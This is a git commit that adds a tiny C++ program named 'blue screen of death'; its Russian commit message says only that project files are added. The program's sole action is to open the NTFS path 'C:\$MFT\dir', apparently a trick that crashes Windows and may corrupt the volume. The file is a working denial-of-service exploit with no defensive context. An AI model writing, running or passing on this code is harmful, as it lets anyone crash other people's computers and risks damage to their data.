38e14e42fed37af289f95254c4b94d620d266ac9
pag6666 <110739163+pag6666@users.noreply.github.com>
2023-05-20 22:11:08 +0300

    Добавьте файлы проекта.

---
+++ blue screen of death/blue screen of death.cpp
@@ -0,0 +1,15 @@
+﻿// blue screen of death.cpp : Этот файл содержит функцию "main". Здесь начинается и заканчивается выполнение программы.
+//
+
+#include <iostream>
+#include<windows.h>
+#include<stdio.h>
+#include<tchar.h>
+
+using namespace std;
+
+int main(int args,_TCHAR *argv[])
+{
+	HANDLE FILE = CreateFileW(L"C:\\$MFT\\dir",FILE_READ_ATTRIBUTES,0,NULL,OPEN_EXISTING,0,NULL);
+	CloseHandle(FILE);
+}
